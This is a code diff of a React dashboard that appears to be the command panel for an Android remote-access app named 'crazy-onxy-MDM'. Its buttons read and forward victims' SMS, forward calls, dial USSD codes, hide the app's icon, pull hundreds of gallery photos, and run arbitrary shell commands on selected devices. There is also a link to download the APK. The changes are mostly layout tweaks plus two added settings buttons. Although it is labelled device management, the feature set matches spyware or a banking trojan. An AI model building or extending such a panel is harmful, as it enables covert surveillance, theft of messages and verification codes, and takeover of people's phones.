@@ -8,6 +8,7 @@ export default function Dashboard() {
   const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
   const [searchQuery, setSearchQuery] = useState('');
   const [toast, setToast] = useState<string | null>(null);
+  
   const [gallery, setGallery] = useState<string[]>([]);
   const [messages, setMessages] = useState<any[]>([]);
   const [perms, setPerms] = useState<any>({});
@@ -34,7 +35,7 @@ export default function Dashboard() {
         }
         if (d.type === 'sms_response') { setMessages(d.messages || []); showToast(`Fetched messages`); }
         if (d.type === 'permissions_response') { setPerms(d.permissions || {}); showToast('Permissions updated'); }
-        if (d.type === 'shell_response') { setOut(d.data); }
+        if (d.type === 'shell_response') { setOut(d.data); showToast('Command executed'); }
       } catch (err) {}
     };
     return () => ws.current?.close();
@@ -56,6 +57,7 @@ export default function Dashboard() {
     <div className="min-h-screen bg-[#0B0C10] text-white flex flex-col md:flex-row font-sans">
       {toast && <div className="fixed top-4 left-1/2 -translate-x-1/2 z-50 bg-[#1A1B23] border border-purple-500 px-6 py-3 rounded-lg shadow-lg text-sm">{toast}</div>}
       
+      {/* SIDEBAR */}
       <aside className="w-full md:w-80 bg-[#1A1B23] border-r border-gray-800 flex flex-col h-[40vh] md:h-screen">
         <div className="p-4 border-b border-gray-800">
           <div className="flex justify-between items-center mb-4">
@@ -75,9 +77,10 @@ export default function Dashboard() {
             ))
           }
         </div>
-        <div className="p-4 border-t border-gray-800"><a href="/crazy-onxy-MDM/app-debug.apk" download className="block text-center text-xs font-bold bg-purple-600 py-2 rounded">⬇ Download APK</a></div>
+        <div className="p-4 border-t border-gray-800"><a href="/crazy-onxy-MDM/app-debug.apk" download className="block text-center text-xs font-bold bg-purple-600 py-2 rounded hover:bg-purple-500">⬇ Download APK</a></div>
       </aside>
 
+      {/* MAIN CONTENT */}
       <main className="flex-1 flex flex-col h-[60vh] md:h-screen overflow-hidden">
         {selectedDevice ? (
           <div className="flex-1 overflow-y-auto p-4 md:p-6">
@@ -97,46 +100,64 @@ export default function Dashboard() {
               ))}
             </nav>
 
-            {subTab === 'Home' && <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
-              {[{l:'Check Online',i:'📡',c:'CHECK_ONLINE'},{l:'GET SMS',i:'📥',c:'GET_SMS'},{l:'Bulk SMS',i:'✉️',c:'BULK_SMS'},{l:'Send SMS',i:'📤',c:'SEND_SMS'},{l:'SMS Forward',i:'🔄',c:'SMS_FORWARD'},{l:'Call Forward',i:'📞',c:'CALL_FORWARD'},{l:'Dial USSD',i:'🔢',c:'DIAL_USSD'},{l:'Hide Icon',i:'🕵️',c:'HIDE_ICON'}].map((b,i) => (
-                <button key={i} onClick={() => send(b.c)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center gap-2"><span className="text-2xl">{b.i}</span><span className="text-xs">{b.l}</span></button>
-              ))}
-            </div>}
+            {/* 10 BUTTONS GRID */}
+            {subTab === 'Home' && (
+              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+                {[
+                  {l:'Check Online', i:'📡', c:'CHECK_ONLINE'}, {l:'GET SMS', i:'📥', c:'GET_SMS'},
+                  {l:'Bulk SMS', i:'✉️', c:'BULK_SMS'}, {l:'Send SMS', i:'📤', c:'SEND_SMS'},
+                  {l:'SMS Forward', i:'🔄', c:'SMS_FORWARD'}, {l:'Call Forward', i:'📞', c:'CALL_FORWARD'},
+                  {l:'Dial USSD', i:'🔢', c:'DIAL_USSD'}, {l:'Hide Icon', i:'🕵️', c:'HIDE_ICON'},
+                  {l:'Dev Settings', i:'⚙️', c:'OPEN_DEVELOPER_SETTINGS'}, {l:'Battery Settings', i:'🔋', c:'OPEN_BATTERY_SETTINGS'}
+                ].map((b,i) => (
+                  <button key={i} onClick={() => send(b.c)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center gap-2 transition group">
+                    <span className="text-2xl group-hover:scale-110 transition">{b.i}</span>
+                    <span className="text-xs font-semibold text-gray-300 text-center">{b.l}</span>
+                  </button>
+                ))}
+              </div>
+            )}
 
-            {subTab === 'Messages' && <div className="space-y-4">
-              <button onClick={() => send('GET_SMS')} className="bg-purple-600 px-4 py-2 rounded text-sm font-bold">Fetch Messages</button>
-              {messages.length === 0 ? <div className="text-gray-500 text-sm">No messages.</div> : messages.map((m, i) => (
-                <div key={i} className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800 text-sm">
-                  <div className="flex justify-between text-xs text-gray-400 mb-2"><span>{m.address}</span><span>{m.date}</span></div>
-                  <p>{m.body}</p>
+            {subTab === 'Messages' && (
+              <div className="space-y-4">
+                <button onClick={() => send('GET_SMS')} className="bg-purple-600 px-4 py-2 rounded text-sm font-bold">Fetch Messages</button>
+                {messages.length === 0 ? <div className="text-gray-500 text-sm">No messages.</div> : messages.map((m, i) => (
+                  <div key={i} className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800 text-sm">
+                    <div className="flex justify-between text-xs text-gray-400 mb-2"><span>{m.address}</span><span>{m.date}</span></div>
+                    <p>{m.body}</p>
+                  </div>
+                ))}
+              </div>
+            )}
+
+            {subTab === 'Gallery' && (
+              <div className="space-y-4">
+                <div className="flex gap-4 mb-4">
+                  <button onClick={() => { setGallery([]); send('GET_GALLERY', {limit: 500, offset: 0}); }} className="bg-blue-600 hover:bg-blue-500 px-4 py-2 rounded text-sm font-bold">Load First 500 Photos</button>
+                  {gallery.length > 0 && <button onClick={() => send('GET_GALLERY', {limit: 500, offset: gallery.length})} className="bg-purple-600 hover:bg-purple-500 px-4 py-2 rounded text-sm font-bold">Load More (+500)</button>}
                 </div>
-              ))}
-            </div>}
-
-            {subTab === 'Gallery' && <div className="space-y-4">
-              <div className="flex gap-4 mb-4">
-                <button onClick={() => { setGallery([]); send('GET_GALLERY', {limit: 500, offset: 0}); }} className="bg-blue-600 hover:bg-blue-500 px-4 py-2 rounded text-sm font-bold">Load First 500 Photos</button>
-                {gallery.length > 0 && (
-                  <button onClick={() => send('GET_GALLERY', {limit: 500, offset: gallery.length})} className="bg-purple-600 hover:bg-purple-500 px-4 py-2 rounded text-sm font-bold">Load More (+500)</button>
-                )}
+                <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
+                  {gallery.map((b, i) => <img key={i} src={`data:image/jpeg;base64,${b}`} className="w-full h-40 object-cover rounded-lg border border-gray-700" />)}
+                </div>
+                {gallery.length === 0 && <div className="text-gray-500 text-center py-10 text-sm">Click 'Load First 500 Photos' to fetch gallery.</div>}
               </div>
-              <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
-                {gallery.map((b, i) => <img key={i} src={`data:image/jpeg;base64,${b}`} className="w-full h-40 object-cover rounded-lg border border-gray-700" />)}
+            )}
+
+            {subTab === 'Permissions' && (
+              <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 max-w-2xl">
+                <div className="flex justify-between mb-4"><h3 className="font-bold">Live Permissions</h3><button onClick={() => send('GET_PERMISSIONS')} className="bg-gray-700 px-3 py-1 text-xs rounded">Fetch</button></div>
+                {Object.keys(perms).length === 0 ? <div className="text-gray-500 text-sm">Click Fetch.</div> : Object.entries(perms).map(([k, v]: any) => (
+                  <div key={k} className="flex justify-between text-sm border-b border-gray-800 py-2"><span>{k}</span><span className={v ? 'text-green-400' : 'text-red-400'}>{v ? '🟢 Allowed' : '🔴 Denied'}</span></div>
+                ))}
               </div>
-              {gallery.length === 0 && <div className="text-gray-500 text-center py-10 text-sm">Click 'Load First 500 Photos' to fetch gallery.</div>}
-            </div>}
+            )}
 
-            {subTab === 'Permissions' && <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 max-w-2xl">
-              <div className="flex justify-between mb-4"><h3 className="font-bold">Live Permissions</h3><button onClick={() => send('GET_PERMISSIONS')} className="bg-gray-700 px-3 py-1 text-xs rounded">Fetch</button></div>
-              {Object.keys(perms).length === 0 ? <div className="text-gray-500 text-sm">Click Fetch.</div> : Object.entries(perms).map(([k, v]: any) => (
-                <div key={k} className="flex justify-between text-sm border-b border-gray-800 py-2"><span>{k}</span><span className={v ? 'text-green-400' : 'text-red-400'}>{v ? '🟢 Allowed' : '🔴 Denied'}</span></div>
-              ))}
-            </div>}
-
-            {subTab === 'Terminal' && <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
-              <div className="flex gap-2 mb-4"><input type="text" value={cmd} onChange={e => setCmd(e.target.value)} placeholder="e.g. pm list packages" className="bg-[#0B0C10] border border-gray-700 rounded p-2 w-full font-mono text-sm outline-none" /><button onClick={() => send('EXECUTE_SHELL', {command: cmd})} className="bg-green-600 px-4 py-2 rounded text-sm font-bold">Run</button></div>
-              <pre className="bg-[#0B0C10] p-4 rounded text-green-400 text-xs font-mono h-64 overflow-y-auto border border-gray-800">{out}</pre>
-            </div>}
+            {subTab === 'Terminal' && (
+              <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
+                <div className="flex gap-2 mb-4"><input type="text" value={cmd} onChange={e => setCmd(e.target.value)} placeholder="e.g. pm list packages" className="bg-[#0B0C10] border border-gray-700 rounded p-2 w-full font-mono text-sm outline-none" /><button onClick={() => send('EXECUTE_SHELL', {command: cmd})} className="bg-green-600 px-4 py-2 rounded text-sm font-bold">Run</button></div>
+                <pre className="bg-[#0B0C10] p-4 rounded text-green-400 text-xs font-mono h-64 overflow-y-auto border border-gray-800">{out}</pre>
+              </div>
+            )}
           </div>
         ) : <div className="flex-1 flex items-center justify-center text-gray-500 text-sm">Select a device to manage.</div>}
       </main>
